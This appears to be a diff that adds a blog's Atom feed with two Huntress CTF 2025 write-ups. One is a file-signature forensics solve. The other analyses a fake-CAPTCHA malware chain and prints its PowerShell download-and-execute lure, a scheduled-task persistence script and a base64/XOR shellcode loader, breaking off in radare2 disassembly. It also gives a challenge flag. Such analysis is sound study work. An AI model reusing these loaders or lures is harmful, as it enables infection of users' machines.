@@ -1,0 +1,585 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-01T13:46:20+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Writeups</title><subtitle>Website where I will publish my writeups</subtitle><author><name>alphaz3r0</name><email></email></author><entry><title type="html">Huntress CTF 2025 - Snooze Writeup</title><link href="http://localhost:4000/writeup/forensics/misc/Snooze" rel="alternate" type="text/html" title="Huntress CTF 2025 - Snooze Writeup" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/misc/Snooze</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/misc/Snooze"><![CDATA[<p><strong>Category:</strong> Forensics</p>
+
+<h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>Don’t bug me, I’m sleeping! Zzzz… zzz… zzzz….</p>
+
+  <p>Uncover the flag from the file presented.</p>
+</blockquote>
+
+<h2 id="solution">Solution</h2>
+
+<p>We are given one file named: <code class="language-plaintext highlighter-rouge">snooze</code></p>
+
+<p>When I checked with the <code class="language-plaintext highlighter-rouge">file</code> command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">file snooze
+snooze: compress<span class="s1">'d data 16 bits</span></code></pre></figure>
+
+<p>When we cat the file, it shows gibberish. So instead we need to use hexdump (or similar tools) to inspect file signatures.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hexdump snooze
+
+0000000 9d1f 6690 84d8 b339 4c67 318c 6e30 c98c
+0000010 a301 998c 3530 e072 61b8 4c23 850e 6834
+0000020 918c 2621 8dc6 3088 9466 a3e9 0000
+000002d</code></pre></figure>
+
+<p>The first bytes are 9d1f. Searching for this file signature reveals:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The file signature 1F 9D is the magic number for a compress file, often a tar.z archive compressed using the Lempel-Ziv-Welch algorithm.
+</code></pre></div></div>
+
+<p>Now we see what extension is missing. We rename it to have the proper extension:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">mv </span>snooze snooze.z</code></pre></figure>
+
+<p>Searching online to see how to extract .z files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To unzip a .z file, you can use the command-line utility gunzip
+</code></pre></div></div>
+
+<p>Let’s try that:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">gunzip </span>snooze.z
+
+file snooze
+snooze: ASCII text</code></pre></figure>
+
+<p>Great! Now it’s identified as ASCII text. Let’s see what’s inside:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat </span>snooze
+flag<span class="o">{</span>c1c07c90efa59876a97c44c2b175903e<span class="o">}</span></code></pre></figure>
+
+<p>Conclusion</p>
+
+<p>This challenge looked pretty easy but it teaches an important topic about <code class="language-plaintext highlighter-rouge">file signatures</code> and how to identify file types by their magic bytes when the extension is missing or incorrect.</p>]]></content><author><name>alphaz3r0</name></author><category term="writeup" /><category term="forensics" /><category term="misc" /><summary type="html"><![CDATA[Category: Forensics]]></summary></entry><entry><title type="html">Huntress CTF 2025 - Verify You Are Human</title><link href="http://localhost:4000/writeup/forensics/malware/Verify-You-Are-Human" rel="alternate" type="text/html" title="Huntress CTF 2025 - Verify You Are Human" /><published>2025-11-01T00:00:00+01:00</published><updated>2025-11-01T00:00:00+01:00</updated><id>http://localhost:4000/writeup/forensics/malware/Verify-You-Are-Human</id><content type="html" xml:base="http://localhost:4000/writeup/forensics/malware/Verify-You-Are-Human"><![CDATA[<p><strong>Category:</strong> Malware</p>
+
+<h2 id="challenge-description">Challenge Description</h2>
+
+<blockquote>
+  <p>My computer said I needed to update MS Teams, so that is what I have been trying to do…</p>
+
+  <p>…but I can’t seem to get past this CAPTCHA!</p>
+</blockquote>
+
+<p><strong>Provided:</strong> <code class="language-plaintext highlighter-rouge">10.0.21.131</code></p>
+
+<h2 id="solution">Solution</h2>
+
+<p>When accessing the web page, this command is put in our clipboard:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="s2">"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe"</span><span class="w"> </span><span class="nt">-Wi</span><span class="w"> </span><span class="n">HI</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$UkvqRHtIr</span><span class="s2">=</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LocalAppData</span><span class="s2">+''+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://10.0.21.131/?tic=1'&gt; </span><span class="nv">$UkvqRHtIr</span><span class="s2">;powershell -Wi HI -ep bypass -f </span><span class="nv">$UkvqRHtIr</span><span class="s2">"</span></code></pre></figure>
+
+<p>So it is accessing <code class="language-plaintext highlighter-rouge">http://10.0.21.131/?tic=1</code> and downloading it and saving it as .PS1 (PowerShell script).</p>
+
+<p>After curling that we get a new obfuscated PowerShell script:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl http://10.0.21.131/?tic<span class="o">=</span>1</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$JGFDGMKNGD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">46</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">112</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">121</span><span class="p">)</span><span class="o">+</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="mi">99</span><span class="p">);</span><span class="w">
+</span><span class="nv">$HMGDSHGSHSHS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">guid</span><span class="p">]::</span><span class="n">NewGuid</span><span class="p">();</span><span class="w">
+</span><span class="nv">$OIEOPTRJGS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">LocalAppData</span><span class="p">;</span><span class="w">
+</span><span class="n">irm</span><span class="w"> </span><span class="s1">'http://10.0.21.131/?tic=2'</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nv">$OIEOPTRJGS</span><span class="nx">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="o">.</span><span class="nf">pdf</span><span class="p">;</span><span class="w">
+</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-AssemblyName</span><span class="w"> </span><span class="nx">System.IO.Compression.FileSystem</span><span class="p">;</span><span class="w">
+</span><span class="p">[</span><span class="n">System.IO.Compression.ZipFile</span><span class="p">]::</span><span class="n">ExtractToDirectory</span><span class="p">(</span><span class="w">
+    </span><span class="s2">"</span><span class="nv">$OIEOPTRJGS</span><span class="s2">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">.pdf"</span><span class="p">,</span><span class="w"> 
+    </span><span class="s2">"</span><span class="nv">$OIEOPTRJGS</span><span class="s2">\</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">"</span><span class="w">
+</span><span class="p">);</span><span class="w">
+</span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Join-Path</span><span class="w"> </span><span class="nv">$OIEOPTRJGS</span><span class="w"> </span><span class="nv">$HMGDSHGSHSHS</span><span class="p">;</span><span class="w">
+</span><span class="nv">$WQRGSGSD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$HMGDSHGSHSHS</span><span class="s2">"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$RSHSRHSRJSJSGSE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$PIEVSDDGs</span><span class="s2">\pythonw.exe"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$RYGSDFSGSH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$PIEVSDDGs</span><span class="s2">\cpython-3134.pyc"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$ENRYERTRYRNTER</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskAction</span><span class="w"> </span><span class="nt">-Execute</span><span class="w"> </span><span class="nv">$RSHSRHSRJSJSGSE</span><span class="w"> </span><span class="nx">\</span><span class="w">
+    </span><span class="nt">-Argument</span><span class="w"> </span><span class="s2">"</span><span class="se">`"</span><span class="nv">$RYGSDFSGSH</span><span class="se">`"</span><span class="s2">"</span><span class="p">;</span><span class="w">
+</span><span class="nv">$TDRBRTRNREN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Date</span><span class="p">)</span><span class="o">.</span><span class="nf">AddSeconds</span><span class="p">(</span><span class="nx">180</span><span class="p">);</span><span class="w">
+</span><span class="nv">$YRBNETMREMY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskTrigger</span><span class="w"> </span><span class="nt">-Once</span><span class="w"> </span><span class="nt">-At</span><span class="w"> </span><span class="nv">$TDRBRTRNREN</span><span class="p">;</span><span class="w">
+</span><span class="nv">$KRYIYRTEMETN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-ScheduledTaskPrincipal</span><span class="w"> </span><span class="nt">-UserId</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="s2">"</span><span class="w"> </span><span class="nx">\</span><span class="w">
+    </span><span class="nt">-LogonType</span><span class="w"> </span><span class="n">Interactive</span><span class="w"> </span><span class="nt">-RunLevel</span><span class="w"> </span><span class="nx">Limited</span><span class="p">;</span><span class="w">
+</span><span class="n">Register-ScheduledTask</span><span class="w"> </span><span class="nt">-TaskName</span><span class="w"> </span><span class="nv">$WQRGSGSD</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nv">$ENRYERTRYRNTER</span><span class="w"> </span><span class="nx">\</span><span class="w">
+    </span><span class="nt">-Trigger</span><span class="w"> </span><span class="nv">$YRBNETMREMY</span><span class="w"> </span><span class="nt">-Principal</span><span class="w"> </span><span class="nv">$KRYIYRTEMETN</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
+</span><span class="n">Set-Location</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="p">;</span><span class="w">
+</span><span class="nv">$WMVCNDYGDHJ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"cpython-3134"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$JGFDGMKNGD</span><span class="p">;</span><span class="w"> 
+</span><span class="n">Rename-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"cpython-3134"</span><span class="w"> </span><span class="nt">-NewName</span><span class="w"> </span><span class="nv">$WMVCNDYGDHJ</span><span class="p">;</span><span class="w"> 
+</span><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="s1">'rundll32 shell32.dll,ShellExec_RunDLL "'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">\</span><span class="w">
+    </span><span class="s1">'\pythonw" "'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$PIEVSDDGs</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'\'</span><span class="o">+</span><span class="w"> </span><span class="nv">$WMVCNDYGDHJ</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'"'</span><span class="p">);</span><span class="w">
+</span><span class="n">Remove-Item</span><span class="w"> </span><span class="bp">$MyInvocation</span><span class="o">.</span><span class="nf">MyCommand</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
+</span><span class="n">Set-Clipboard</span></code></pre></figure>
+
+<p>Here the most important thing is now accessing <code class="language-plaintext highlighter-rouge">http://10.0.21.131/?tic=2</code>. After curling that:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl http://10.0.21.131/?tic<span class="o">=</span>2
+Warning: Binary output can mess up your terminal. Use <span class="s2">"--output -"</span> to tell 
+Warning: curl to output it to your terminal anyway, or consider <span class="s2">"--output &lt;FILE&gt;"</span> to save to a file.</code></pre></figure>
+
+<p>If we output it to a file and run the <code class="language-plaintext highlighter-rouge">file</code> command:</p>
+
+<p>file tic2
+tic2: Zip archive data, at least v2.0 to extract, compression method=deflate</p>
+
+<p>Zip archive is interesting, let’s see what is there when we extract it:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">inflating: LICENSE.txt
+inflating: _asyncio.pyd
+inflating: _bz2.pyd
+inflating: _ctypes.pyd
+inflating: _decimal.pyd
+inflating: _elementtree.pyd
+inflating: _hashlib.pyd
+inflating: _lzma.pyd
+inflating: _multiprocessing.pyd
+inflating: _overlapped.pyd
+inflating: _queue.pyd
+inflating: _socket.pyd
+inflating: _sqlite3.pyd
+inflating: _ssl.pyd
+inflating: _uuid.pyd
+inflating: _wmi.pyd
+inflating: _zoneinfo.pyd
+inflating: cpython-3134.pyc
+inflating: libcrypto-3.dll
+inflating: libffi-8.dll
+inflating: libssl-3.dll
+inflating: output.py
+inflating: pyexpat.pyd
+inflating: python.cat
+inflating: python.exe
+inflating: python3.dll
+inflating: python313._pth
+inflating: python313.dll
+inflating: python313.zip
+inflating: pythonw.exe
+inflating: <span class="k">select</span>.pyd
+inflating: sqlite3.dll
+inflating: unicodedata.pyd
+inflating: vcruntime140.dll
+inflating: winsound.pyd</code></pre></figure>
+
+<p>A lot of stuff, but for now I will just look at <code class="language-plaintext highlighter-rouge">output.py</code>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+<span class="c1">#nfenru9en9vnebvnerbneubneubn
+</span><span class="k">exec</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+    <span class="s">"aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRf"</span>
+    <span class="s">"Ynl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVt"</span>
+    <span class="s">"ZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlf"</span>
+    <span class="s">"bGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVj"</span>
+    <span class="s">"cnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdI"</span>
+    <span class="s">"Ujl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRFAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVY"</span>
+    <span class="s">"NW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1"</span>
+    <span class="s">"ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09Jykp"</span>
+    <span class="s">"KQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChs"</span>
+    <span class="s">"ZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19j"</span>
+    <span class="s">"aGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3Zl"</span>
+    <span class="s">"TWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5"</span>
+    <span class="s">"cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp"</span>
+<span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+<span class="c1">#g0emgoemboemoetmboemomeio</span></code></pre></figure>
+
+<p>Let’s decode the string we have:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbD32LlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp"</span> | <span class="nb">base64</span> <span class="nt">-d</span></code></pre></figure>
+
+<p>We got a new script:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">ctypes</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">):</span>
+    <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">):</span>
+        <span class="n">decrypted_byte</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+        <span class="n">decrypted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypted_byte</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">)</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">xor_decrypt</span><span class="p">(</span>
+    <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+        <span class="s">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'</span>
+        <span class="s">'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'</span>
+        <span class="s">'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span>
+    <span class="p">),</span> 
+    <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="p">)</span>
+<span class="p">))</span>
+
+<span class="n">ptr</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> 
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span> 
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span> 
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span>
+<span class="p">)</span>
+
+<span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)).</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span><span class="p">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span>
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> 
+    <span class="n">buf</span><span class="p">,</span> 
+    <span class="n">ctypes</span><span class="p">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+<span class="p">)</span>
+
+<span class="n">functype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CFUNCTYPE</span><span class="p">(</span><span class="n">ctypes</span><span class="p">.</span><span class="n">c_void_p</span><span class="p">)</span>
+<span class="n">fn</span> <span class="o">=</span> <span class="n">functype</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
+<span class="n">fn</span><span class="p">()</span></code></pre></figure>
+
+<p>This is a shellcode execution script that:</p>
+
+<ol>
+  <li><strong>Decrypts</strong> a Base64-encoded payload using XOR decryption</li>
+  <li><strong>Allocates</strong> executable memory in Windows</li>
+  <li><strong>Executes</strong> the decrypted shellcode directly</li>
+</ol>
+
+<p>Let’s extract the shellcode and save it as <code class="language-plaintext highlighter-rouge">shellcode.bin</code>:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">,</span> <span class="n">key_bytes</span><span class="p">):</span>
+    <span class="n">decrypted_bytes</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
+    <span class="n">key_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key_bytes</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ciphertext_bytes</span><span class="p">):</span>
+        <span class="n">decrypted_byte</span> <span class="o">=</span> <span class="n">byte</span> <span class="o">^</span> <span class="n">key_bytes</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_length</span><span class="p">]</span>
+        <span class="n">decrypted_bytes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">decrypted_byte</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">decrypted_bytes</span><span class="p">)</span>
+
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span>
+    <span class="s">'zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/'</span>
+    <span class="s">'xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2b'</span>
+    <span class="s">'uDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='</span>
+<span class="p">)</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">'me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA=='</span><span class="p">)</span>
+
+<span class="n">decrypted_shellcode</span> <span class="o">=</span> <span class="n">xor_decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="c1"># Save to file for analysis
+</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'shellcode.bin'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_shellcode</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Shellcode saved to shellcode.bin (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">decrypted_shellcode</span><span class="p">)</span><span class="si">}</span><span class="s"> bytes)"</span><span class="p">)</span></code></pre></figure>
+
+<p>I will be using radare2 here:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">r2 <span class="nt">-a</span> x86 <span class="nt">-b</span> 32 shellcode.bin</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">[0x00000000]&gt; aaa
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze imports (af@@@i)
+INFO: Analyze symbols (af@@@s)
+INFO: Analyze all functions arguments/locals (afva@@@F)
+INFO: Analyze function calls (aac)
+INFO: find and analyze function preludes (aap)
+INFO: Analyze len bytes of instructions for references (aar)
+INFO: Finding and parsing C++ vtables (avrr)
+INFO: Analyzing methods (af @@ method.*)
+INFO: Recovering local variables (afva@@@F)
+INFO: Type matching analysis for all functions (aaft)
+INFO: Propagate noreturn information (aanr)
+INFO: Use -AA or aaaa to perform additional experimental analysis
+[0x00000000]&gt; afl
+0x00000000    7    130 fcn.00000000
+[0x00000000]&gt; pdf @fcn.00000000
+            ;-- oeax:
+            ;-- eax:
+            ;-- ebx:
+            ;-- ecx:
+            ;-- edx:
+            ;-- esi:
+            ;-- edi:
+            ;-- eip:
+            ;-- eflags:
+┌ 130: fcn.00000000 ();
+│ afv: vars(3:sp[0x84..0x86])
+│           0x00000000      55             push ebp
+│           0x00000001      89e5           mov ebp, esp
+│           0x00000003      81ec80000000   sub esp, 0x80
+│           0x00000009      6893d88484     push 0x8484d893
+│           0x0000000e      6890c3c697     push 0x97c6c390
+│           0x00000013      68c3909392     push 0x929390c3
+│           0x00000018      6890c4c3c7     push 0xc7c3c490
+│           0x0000001d      689c939c93     push 0x939c939c
+│           0x00000022      68c09cc6c6     push 0xc6c69cc0
+│           0x00000027      6897c69c93     push 0x939cc697
+│           0x0000002c      6894c79dc1     push 0xc19dc794
+│           0x00000031      68dec19691     push 0x9196c1de
+│           0x00000036      68c3c9c4c2     push 0xc2c4c9c3
+│           0x0000003b      b90a000000     mov ecx, 0xa
+│           ; DATA XREF from fcn.00000000 @ 0x73(r)
+│           0x00000040      89e7           mov edi, esp
